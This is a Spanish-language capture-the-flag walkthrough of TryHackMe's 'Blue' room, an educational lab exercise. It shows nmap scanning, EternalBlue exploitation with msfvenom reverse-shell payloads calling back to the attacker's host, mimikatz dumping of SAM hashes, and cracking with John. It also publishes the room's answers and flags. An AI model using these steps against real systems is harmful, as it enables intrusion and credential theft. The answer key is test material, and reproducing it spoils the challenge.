---
title: TryHackMe - Blue
published: true
excerpt: "Máquina Blue de la plataforma TryHackMe"
cover:
    image: "images/blue-tryhackme/blue.jpeg"
categories: [Windows]
tags: [TryHackMe, eJPT, Windows]
---


Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## Tarea 1(Recon)

Empezaremos escaneando los puertos de la máquina con la herramienta Nmap.

```
nmap -sCV -p- --min-rate 5000 -Pn -n -oN escaneo 10.10.30.156

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-11-23T19:55:48
|_Not valid after:  2023-05-25T19:55:48
|_ssl-date: 2022-11-24T20:22:46+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:de:2e:40:e0:1f (unknown)
| smb2-time: 
|   date: 2022-11-24T20:22:40
|_  start_date: 2022-11-24T19:55:47
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-24T14:22:39-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
```
La máquina tiene abiertos los puertos 135, 139, 445, 3389, 49152, 49153, 49154, 49158, 49160 

Vamos a lanzarle un escaneo de vulnerabilidades a esos puertos

```
nmap -p135,139,445,3389,49152,49153,49154,49158,49160 --script="smb-vuln*" 10.10.30.156 -oN vulnScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 17:34 -03
Nmap scan report for 10.10.72.183
Host is up (0.24s latency).

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```

La máquina es vulnerable al ms17-010(Eternal Blue), vamos a explotarlo.

### Preguntas

1. Scan the machine - ```No answer needed```
2. How many ports are open with a port number under 1000? - ```3```
3. What is this machine vulnerable to? - ```ms17-010```

## Tarea 2(Gain Access)

Para ganar acceso vamos a hacer uso de la herramienta [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
Luego de clonar ese repositorio, nos meteremos a la carpeta ```shellcode``` y vamos a ejecutar el archivo ```shell_prep.sh```

~~~
./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
Y
LHOST for reverse connection:
10.8.10.34
LPORT you want x64 to listen on:
443
LPORT you want x86 to listen on:
6969
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.8.10.34 LPORT=443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.8.10.34 LPORT=6969
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
~~~

Con esto crearemos 2 archivos maliciosos, uno para la arquitectura x64 y otro x86, primero nos pondremos en escucha por el puerto que indicamos en el primer archivo malicioso(x64) en mi caso es el puerto 443 y ejecutaremos el script de Python llamado ```eternalblue_exploit7.py```

![image.png](https://i.postimg.cc/7ZP7CxTL/image.png)

Como podemos observar ya nos llegó la reverse shell, probablemente el exploit lo deban ejecutar varias veces para que les llegue, Aunque no lo haya hecho con metasploit, les pondré las respuestas de las preguntas.

1. Start Metasploit - ```No answer needed```
2. Find the exploitation code we will run against the machine. What is the full path of the code? - ```exploit/windows/smb/ms17_010_eternalblue```
3. Show options and set the one required value. What is the name of this value? - ```RHOSTS```
4. With that done, run the exploit! - ```No answer needed```
5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. - ```No answer needed```

## Tarea 3(Escalate)

Esto nos lo podemos saltar, ya que no usamos metasploit para la reverse shell, pero de igual forma les dejaré las respuestas de las preguntas.

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - ```post/multi/manage/shell_to_meterpreter```
2. Select this (use MODULE_PATH). Show options, what option are we required to change? - ```SESSION```
3. Set the required option, you may need to list all of the sessions to find your target here. - ```No answer needed```
4. Run! If this doesn't work, try completing the exploit from the previous task once more. - ```No answer needed```
5. Once the meterpreter shell conversion completes, select that session for use. - ```No answer needed```
6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. - ```No answer needed```
7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column). - ```No answer needed``` 
8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. - ```No answer needed``` 

## Tarea 4(Cracking)

En esta sección nos hacen dumpear los hashes de los usuarios para luego crackearlos mediante fuerza bruta, para extraerlos usaremos la herramienta [mimikatz](https://github.com/ParrotSec/mimikatz), usaremos el mimikatz.exe que se encuentra en la carpeta x64.

Para transferirlo a la máquina víctima usaremos la herramienta impacket-smbserver

![image.png](https://i.postimg.cc/XqjGZb2W/image.png)Una vez transferido a la máquina víctima lo ejecutaremos.

```
C:\>mimikatz.exe

mimikatz # lsadump::sam
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d

mimikatz # 
```

Una vez dumpeados los hashes NTLM, vemos que está el de Administrator y el de Jon, nos copiaremos el hash de Jon y lo crackearemos utilizando la herramienta John, para eso copiaremos el hash y lo guardaremos en un archivo en nuestra máquina.
```
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash
john -w=/usr/share/wordlists/rockyou.txt hash --format=nt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:00 DONE (2022-11-24 19:49) 1.219g/s 12439Kp/s 12439Kc/s 12439KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

### Preguntas
1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? - ```Jon```
2. Copy this password hash to a file and research how to crack it. What is the cracked password? - ```alqfna22```

## Tarea 5(Find Flags)

Para encontrar las flags ejecutaremos ```dir /s /b flag*```
```
C:\>dir /s /b flag*
C:\flag1.txt
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk
C:\Users\Jon\Documents\flag3.txt
C:\Windows\System32\config\flag2.txt

C:\>type C:\flag1.txt
flag{access_the_machine}
C:\>type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
C:\>type C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```

### Preguntas
1. Flag1? This flag can be found at the system root. - ```flag{access_the_machine}```
2. Flag2? This flag can be found at the location where passwords are stored within Windows. - ```flag{sam_database_elevated_access}```
3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. - ```flag{admin_documents_can_be_valuable}```

